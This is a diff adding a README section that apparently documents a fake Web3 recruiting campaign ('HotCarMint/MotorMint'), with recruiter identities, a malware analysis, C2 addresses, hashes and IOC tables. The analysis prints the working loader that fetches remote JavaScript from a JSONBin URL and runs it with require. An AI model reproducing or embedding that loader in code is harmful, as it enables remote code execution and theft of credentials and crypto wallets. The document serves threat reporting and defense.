@@ -55,6 +55,7 @@ The code is kept for educational and research purposes only.
   - [15. Test Project](#15-test-project)
   - [16. ACNPlay-Demo (0xroaman Campaign)](#16-acnplay-demo-0xroaman-campaign)
   - [17. Novaremix Vault (novaremix-vault-zoom)](#17-novaremix-vault-novaremix-vault-zoom)
+  - [18. HotCarMint / MotorMint (fake Web3 vehicle marketplace)](#18-hotcarmint--motormint-fake-web3-vehicle-marketplace)
 - [Checking for Malicious npm Packages](#checking-for-malicious-npm-packages)
 
 ## Known Scam Repos and APIs
@@ -80,6 +81,10 @@ The code is kept for educational and research purposes only.
 - https://github.com/aitech-nexus/ACNPlay-Demo
 - https://everydaynodechecker-39147n.vercel.app/api/key
 - https://novaremix.com
+- https://github.com/ava-tech-glitch/HotCarMint
+- https://api.jsonbin.io/v3/b/6a7af29df5f4af5e290685a0
+- http://130.94.92.170
+- http://65.109.105.95:4552
   
 ### Known scammer recruiter profiles
 
@@ -106,6 +111,7 @@ The code is kept for educational and research purposes only.
 - [Daniel Feit DMD CAGS MS FICD](https://www.linkedin.com/in/daniel-feit-dmd-cags-ms-ficd-90943937/) (hijacked dental professional profile, headline changed to "CTO at J-Soft Labs")
 - [Cecilia Díaz Cruz](https://www.linkedin.com/in/ceciliadic/) (Innovation Lead & Executive | Co-Founder & CEO | IT & Business Strategy Management)
 - [Karem Emad](https://www.linkedin.com/in/karem-emad-813927402)
+- [Zakhar H](https://www.linkedin.com/in/zakhar-h-5a7b3a269/) (account used in the HotCarMint recruitment campaign; the underlying person/account may have been compromised)
 
 ## Extra Links
 
@@ -898,6 +904,163 @@ This campaign uses a psychological **two-phase bait-and-switch** strategy design
 - **Social Engineering:** Relies on exploiting trust built through clean initial repository reviews.
 
 > ⚠️ **DO NOT RUN.** This directory contains live/quarantined malicious code. Inspect it for research and security analysis purposes only — do not execute it or install its dependencies.
+
+---
+
+### 18. HotCarMint / MotorMint (fake Web3 vehicle marketplace)
+
+Reported August 2026. This campaign targeted a Full Stack / Web3 developer through LinkedIn with a fake long-term remote role for a cryptocurrency-enabled vehicle marketplace.
+
+The recruiter advertised a React / Node.js / TypeScript / Solidity stack, compensation of roughly USD 8k–12k/month or USD 50–80/hour, and then directed the candidate to a GitHub project presented as the product codebase.
+
+**Social-engineering infrastructure**
+
+| Asset | Detail |
+|-------|--------|
+| LinkedIn account used | [Zakhar H](https://www.linkedin.com/in/zakhar-h-5a7b3a269/) |
+| Claimed LinkedIn employer | Dev.Pro |
+| Calendly display identity | `HR_BestPeers` |
+| Calendly slug | `calendly.com/hr-dev-tech/30min` |
+| Calendly Reply-To | `hr@dev-tech.cv` |
+| Recruiting domain | `dev-tech.cv` |
+| Domain registration date | 2026-02-27 |
+| Registrar / mail | Namecheap / Namecheap Private Email |
+
+The `dev-tech.cv` domain was configured for email but had no normal company website; `www.dev-tech.cv` resolved to Namecheap parking infrastructure. No verified relationship was established between `dev-tech.cv`, BestPeers, and Dev.Pro.
+
+The LinkedIn account blocked the reporter and communication stopped shortly after the malicious code was questioned. Because the LinkedIn profile appears to have a longer professional history, it is possible that a legitimate account was compromised; this report does **not** assert that the real person represented by the profile operated the malware campaign.
+
+**Malicious repository**
+
+- Repository: `https://github.com/ava-tech-glitch/HotCarMint`
+- Repository owner: `ava-tech-glitch`
+- Repository name presented in README: `MotorMint`
+- Malicious file: `src/vite-env.ts`
+- Malicious commit: `bbf5cbdce690241a7cb4877f9931420886cd2b42` (`Add vite-env.ts`)
+- Repository was made private/inaccessible after the malicious code was challenged.
+
+The malicious code was hidden in `src/vite-env.ts` behind a large amount of whitespace. It fetched JavaScript from a remotely controlled JSONBin record and executed the returned value with Node.js `require` available:
+
+```javascript
+const axios = require("axios");
+
+(async () => {
+  try {
+    const { data } = await axios.get(
+      "https://api.jsonbin.io/v3/b/6a7af29df5f4af5e290685a0"
+    );
+    new Function("require", data.record.cookie)(require);
+  } catch (err) {
+    console.error("Error:", err.message);
+  }
+})();
+```
+
+This design lets the attacker replace the second-stage payload without making another Git commit.
+
+**Captured JSONBin second-stage payload**
+
+- JSONBin ID: `6a7af29df5f4af5e290685a0`
+- Record created: `2026-08-11T09:59:57.255Z`
+- Payload field: `record.cookie`
+- Payload: heavily obfuscated JavaScript
+
+Static analysis of the captured payload identified functionality for:
+
+- clipboard monitoring and exfiltration;
+- browser credential/database theft;
+- cryptocurrency wallet-extension targeting, including MetaMask;
+- searching for seed phrases, mnemonic/recovery material, `.env` files, source code, documents, screenshots and wallet files;
+- host fingerprinting and virtualization checks;
+- additional payload download and execution;
+- persistence mechanisms;
+- MetaMask-related browser-extension manipulation.
+
+Observed first-stage infrastructure included:
+
+```text
+130.94.92.170
+```
+
+The payload downloaded an OS-specific archive; the captured Windows archive was `r_w.zip`.
+
+**Windows RAT / remote-access payload**
+
+Captured archive:
+
+```text
+r_w.zip
+SHA-256: d31261effc663c67d6b71f17014a12057835fe5572fe57255289c00be2faee6f
+```
+
+Contained executable:
+
+```text
+RemoteDesk-Agent.exe
+SHA-256: b1fc05980d00b9e6d99f3cb6eba9378427ea31f25a0b245717d8874c6cf2beb0
+SHA-1:   0ea914f2e3fa31a5f46903adc729d62d6be8b774
+MD5:     c790735892feffa7026a4edab18533d2
+```
+
+Static inspection identified the executable as a PyInstaller-packaged Python remote-access agent. Embedded modules/capabilities included:
+
+- remote `cmd.exe` shell execution;
+- screen capture;
+- remote mouse and keyboard input;
+- file listing, upload and download;
+- host/system and geolocation reconnaissance;
+- persistence functionality;
+- a separate/hidden Windows virtual desktop intended to allow remote activity without switching the user's visible desktop.
+
+Relevant embedded settings:
+
+```text
+REQUIRE_CONSENT = False
+AGENT_HIDDEN = True
+```
+
+Embedded RAT command-and-control:
+
+```text
+PUBLIC_HOST = 65.109.105.95
+PORT = 4552
+SERVER_URL = http://65.109.105.95:4552
+WebSocket path = /ws/agent/<machine-id>
+```
+
+Additional bootstrap infrastructure observed in the RAT:
+
+```text
+https://jsonkeeper.com/b/GUIIX
+```
+
+**Primary IOCs**
+
+| Type | Indicator |
+|------|-----------|
+| GitHub repo | `github.com/ava-tech-glitch/HotCarMint` |
+| GitHub commit | `bbf5cbdce690241a7cb4877f9931420886cd2b42` |
+| Loader | `src/vite-env.ts` |
+| JSONBin | `api.jsonbin.io/v3/b/6a7af29df5f4af5e290685a0` |
+| First-stage IP | `130.94.92.170` |
+| RAT C2 | `65.109.105.95:4552` |
+| Bootstrap | `jsonkeeper.com/b/GUIIX` |
+| Recruiting domain | `dev-tech.cv` |
+| Recruiting mailbox | `hr@dev-tech.cv` |
+| RAT filename | `RemoteDesk-Agent.exe` |
+| RAT SHA-256 | `b1fc05980d00b9e6d99f3cb6eba9378427ea31f25a0b245717d8874c6cf2beb0` |
+| ZIP SHA-256 | `d31261effc663c67d6b71f17014a12057835fe5572fe57255289c00be2faee6f` |
+
+**Actions taken by reporter**
+
+- GitHub abuse / DSA report filed.
+- LinkedIn scam report filed.
+- Calendly abuse ticket opened and escalated to a human reviewer.
+- Namecheap abuse report prepared for `dev-tech.cv` / `hr@dev-tech.cv`.
+- Hetzner abuse report prepared for the RAT C2 `65.109.105.95:4552`.
+- Malware sample prepared for submission to Microsoft Security Intelligence / Defender.
+
+> ⚠️ **DO NOT RUN.** The JavaScript payload and `RemoteDesk-Agent.exe` are live malicious artifacts. Analyze statically or only inside an isolated malware-analysis environment with networking disabled or tightly controlled.
 
 ---
 
